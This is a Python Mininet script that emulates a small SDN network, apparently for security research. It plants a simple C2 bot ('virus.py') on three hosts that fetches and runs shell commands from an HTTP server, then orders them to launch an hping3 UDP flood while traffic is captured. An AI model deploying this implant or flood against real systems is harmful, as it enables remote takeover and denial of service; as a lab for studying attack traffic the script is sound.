import time
from pathlib import Path
from subprocess import Popen

from mininet.net import Mininet
from mininet.node import OVSController
from mininet.log import setLogLevel


def create_network():
    # Ensure that the network is clean
    Popen("mn -c", shell=True).wait()

    # Ensure required packages are installed
    Popen("apt-get update && apt-get install -y bwm-ng tcpdump hping3", shell=True).wait()

    # Create a network
    net = Mininet(controller=OVSController)

    # Add a controller
    net.addController('c0')

    # Add switches
    s1 = net.addSwitch('s1')
    s2 = net.addSwitch('s2')
    s3 = net.addSwitch('s3')

    # Add hosts and links to s1
    h1 = net.addHost('h1', ip='10.42.0.1')
    h2 = net.addHost('h2', ip='10.42.0.2')
    net.addLink(h1, s1, bw=200)
    net.addLink(h2, s1, bw=100)

    # Add hosts and links to s2
    h3 = net.addHost('h3', ip='10.42.0.3')
    h4 = net.addHost('h4', ip='10.42.0.4')
    net.addLink(h3, s2, bw=100)
    net.addLink(h4, s2, bw=100)

    # Add hosts and links to s3
    h5 = net.addHost('h5', ip='10.42.0.5')
    h6 = net.addHost('h6', ip='10.42.0.6')
    net.addLink(h5, s3, bw=100)
    net.addLink(h6, s3, bw=100)

    # Add links between switches
    net.addLink(s1, s2, bw=1000)
    net.addLink(s2, s3, bw=1000)

    # Start the network
    net.start()

    # Run a simple webserver on h5 (attacker node (C2 Server))
    print("[+] Setting up the C2 server...")
    h6.cmd("echo 'ls' > command")
    h6.cmd("python3 -m http.server 80 &> /tmp/server.log &")

    print("    [+] Waiting for the C2 server to be ready...")
    time.sleep(2)

    out = h2.cmd("curl http://10.42.0.6/command")
    if "ls" not in out:
        print("    [+] Failed to setup the C2 server.")
        print(h6.cmd("cat /tmp/server.log"))
        return

    print("    [+] C2 server is ready.")

    # Simulate Infection
    print("[+] Simulating infection...")
    for host in [h2, h4, h5]:
        # host.cmd('wget https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/simple-virus.py -O virus.py')
        virus = """import time
import urllib.request
import subprocess

url = \\"http://10.42.0.6/command\\"

while True:
    response = urllib.request.urlopen(url)
    command = response.read().decode(\\"utf-8\\").strip()
    
    if command:
        subprocess.call(command, shell=True)
        
    time.sleep(10)
        """
        host.cmd(f"echo \"{virus}\" > virus.py")
        host.cmd('python3 virus.py &> output.txt &')

    # Start Monitoring
    print("[+] Starting monitoring...")
    Popen("rm /tmp/mon.csv", shell=True).wait()
    Popen("bwm-ng -o csv -T rate -C ',' > /tmp/mon.csv &", shell=True).wait()

    # Start Capturing
    print("[+] Starting capturing...")
    for i in range(1, 4):
        for j in range(1, 3):
            Popen(f"rm /tmp/s{i}-eth{j}.pcap", shell=True).wait()
            Popen(f"tcpdump -i s{i}-eth{j} -w /tmp/s{i}-eth{j}.pcap &", shell=True).wait()

    time.sleep(1)
    print()

    net.pingAll()

    # Wait for the network to stabilize
    print("[+] Waiting for the network to stabilize...")
    time.sleep(5)

    print("[+] Starting the attack...")

    # Start the attack
    cmd = f"sudo hping3 --flood --udp {h1.IP()} &"
    print(f"    [+] Running: {cmd}")
    h5.cmd(f"echo \"{cmd}\" > command")

    print("    [+] Waiting for the attack to take effect...")
    time.sleep(10)

    print("    [+] Press Ctrl+C once to stop the attack...")
    try:
        while True:
            net.ping([h3, h1])
            time.sleep(1)
    except KeyboardInterrupt:
        pass

    time.sleep(1)

    print("    [+] Stopping the attack...")

    for host in [h2, h4, h5]:
        host.cmd('killall python')
        host.cmd('killall hping3')

    # Wait for the network to stabilize
    time.sleep(2)

    # Stop the capturing
    print("[+] Stopping the capturing...")
    Popen("killall tcpdump", shell=True).wait()

    # Stop the monitoring
    print("[+] Stopping the monitoring...")
    Popen("killall bwm-ng", shell=True).wait()

    # Copy logs
    print("[+] Copying logs...")
    for host in [h2, h4, h5]:
        Path(f"/tmp/{host.name}.txt").write_text(host.cmd("cat output.txt"))

    Path("/tmp/server.log").write_text(h6.cmd("cat /tmp/server.log"))

    # Stop the network
    print("[+] Stopping the network...")
    try:
        net.stop()
    except Exception:
        print("    [-] Failed to stop the network.")

    print("[+] Tarring the results...")
    Popen("tar -czvf /tmp/results.tar.gz /tmp/mon.csv /tmp/s*.pcap /tmp/*.txt", shell=True).wait()

    print("[+] Done.")

if __name__ == '__main__':
    setLogLevel('info')
    create_network()